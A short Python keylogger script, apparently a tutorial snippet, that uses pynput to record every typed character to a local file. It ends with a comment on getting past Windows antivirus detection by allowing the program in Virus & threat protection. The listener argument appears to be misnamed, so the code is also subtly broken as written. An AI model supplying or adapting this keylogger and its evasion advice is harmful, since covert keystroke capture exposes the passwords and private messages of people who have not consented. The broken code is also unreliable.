# pip install pynput
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    # open loggedfile.txt, if the file does not exist, create one and just append to it
    # we name the file in our application as logkey. so that we can reference it later on as we code
    with open("loggedfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("error getting the char")
            
    

if __name__ == "__main__":
    listener = keyboard.Listener(onPress=keyPressed)
    listener.start()
    input()
    
   
    """
    if you are runding this in windows, antivirus will detect it from running
    when you run the keylogger, go to virus and thread protection and allow it
    """